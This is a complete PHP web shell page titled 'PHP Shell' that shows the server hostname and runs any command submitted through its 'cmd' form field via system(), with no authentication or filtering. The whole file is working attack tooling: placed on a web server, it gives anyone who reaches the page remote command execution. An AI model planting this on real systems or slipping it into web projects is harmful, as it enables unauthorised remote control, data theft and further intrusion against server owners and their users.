<html>
	<meta charset="UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	
	<head>
		<title><?php system('hostname');?> | PHP Shell</title>
	</head>
	
	<style>
		body{
			background-color: #222;
			color:white;
			padding:15px;
			font-family: "Open Sans", sans-serif;
		}
		
		.button {
			  letter-spacing: 2px;
			  text-decoration: none;
			  text-transform: uppercase;
			  color: #000;
			  cursor: pointer;
			  border: 2px solid white;
			  background-color: #222;
			  color: white;
		}
		
	</style>

	<body>
	
		<form>
			<?php system('hostname');?>> <input type="text" name="cmd" />
			<input type="submit" value="Enter" class="button"/>
		</form>

		<?php 
			if(isset($_GET['cmd']) && !empty($_GET['cmd'])) system($_GET['cmd']); 
		?>

	</body>
	
</html>
